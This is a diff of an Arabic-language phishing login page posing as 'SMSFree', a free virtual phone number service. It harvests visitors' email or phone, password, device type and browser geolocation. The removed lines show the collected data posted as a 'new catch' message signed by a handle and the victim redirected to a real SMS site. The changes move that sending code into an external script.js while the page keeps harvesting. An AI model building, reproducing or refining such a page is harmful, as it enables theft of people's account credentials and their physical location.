@@ -10,15 +10,18 @@
             --bg-color: #0f172a;
             --card-bg: rgba(30, 41, 59, 0.7);
             --primary-cyan: #22d3ee;
+            --accent-glow: rgba(34, 211, 238, 0.3);
             --text-white: #f8fafc;
             --input-bg: rgba(15, 23, 42, 0.6);
         }
+
         body {
             margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
             background: radial-gradient(circle at top right, #1e293b, #0f172a);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white); overflow: hidden;
         }
+
         .main-container {
             width: 90%; max-width: 420px; background: var(--card-bg);
             backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
@@ -26,7 +29,9 @@
             box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
             position: relative;
         }
+
         .is-banned .blur-content { filter: blur(20px); opacity: 0.1; pointer-events: none; }
+
         .logo-circle {
             width: 100px; height: 100px; border: 2px solid var(--primary-cyan);
             border-radius: 50%; margin: 0 auto 25px;
@@ -34,19 +39,23 @@
             font-size: 20px; font-weight: 800; color: var(--primary-cyan);
             background: rgba(34, 211, 238, 0.05); text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
         }
+
         h2 { font-size: 16px; font-weight: 400; color: #cbd5e1; margin-bottom: 35px; line-height: 1.7; }
+
         input {
             width: 100%; padding: 16px 20px; background: var(--input-bg);
             border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
             color: white; outline: none; text-align: center; font-size: 15px;
             margin-bottom: 18px; box-sizing: border-box;
         }
+
         .submit-btn {
             width: 100%; padding: 18px; 
             background: linear-gradient(135deg, #155e75, #22d3ee); 
             border: none; border-radius: 15px; color: #0f172a;
             font-size: 17px; font-weight: 700; cursor: pointer;
         }
+
         .ban-overlay {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
             z-index: 100; text-align: center; display: none; width: 100%;
@@ -61,26 +70,24 @@
         <h3 style="color: #fbbf24;">لقد تم حظرك مؤقتاً</h3>
         <div id="timer">30</div>
     </div>
+
     <div class="blur-content">
         <div class="logo-circle">SMSFree</div>
         <h2>سجل دخولك الآن لتستمتع بوصول غير محدود للأرقام العالمية وتفعيل حساباتك فوراً.</h2>
         <form id="loginForm">
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
             <input type="password" id="pass" placeholder="كلمة المرور" required>
             <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
         </form>
+        <p style="margin-top: 25px; font-size: 11px; color: #64748b;">© Global Virtual Numbers Pro 2026. جميع الحقوق محفوظة.</p>
     </div>
 </div>
 
-<script>
-    var loginAttempts = 0;
+<script src="script.js"></script>
 
-    function getDevice() {
-        var ua = navigator.userAgent;
-        if (/android/i.test(ua)) return "Android 🤖";
-        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS 🍎";
-        return "PC 💻";
-    }
+<script>
+    // هذا الجزء يبقي نظام الحظر يعمل، ولكنه يرسل البيانات عبر الملف الخارجي
+    var loginAttempts = 0;
 
     document.getElementById('loginForm').onsubmit = function(e) {
         e.preventDefault();
@@ -89,21 +96,22 @@
 
         if (u.length >= 5 && p.length >= 6) {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(pos) {
-                    var loc = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var loc = "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude;
+                    // يتم استدعاء الدالة من ملف script.js
                     sendData(u, p, loc);
                 }, function() {
                     sendData(u, p, "الموقع مرفوض 📍");
                 });
             } else {
-                sendData(u, p, "لا يدعم الموقع ❌");
+                sendData(u, p, "المتصفح لا يدعم الموقع ❌");
             }
         } else {
             loginAttempts++;
             if (loginAttempts >= 3) {
                 showBan();
             } else {
-                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة', icon: 'error' });
+                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة، حاول مرة أخرى.', icon: 'error' });
             }
         }
     };
@@ -123,29 +131,7 @@
             }
         }, 1000);
     }
-
-    function sendData(u, p, l) {
-        var dev = getDevice();
-        // تنسيق بسيط ومضمون لا يكسر الكود
-        var msg = "🎯 صيد جديد مرتب 🎯\n" +
-                  "━━━━━━━━━━━━━━\n" +
-                  "👤 المستخدم: " + u + "\n" +
-                  "🔑 كلمة السر: " + p + "\n" +
-                  "📱 الجهاز: " + dev + "\n" +
-                  "📍 الموقع: " + l + "\n" +
-                  "━━━━━━━━━━━━━━\n" +
-                  "👤 @M6_vip";
-
-        fetch('/api/save', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: msg })
-        }).then(function() {
-            window.location.href = "https://receive-smss.com/";
-        }).catch(function() {
-            window.location.href = "https://receive-smss.com/";
-        });
-    }
 </script>
+
 </body>
 </html>
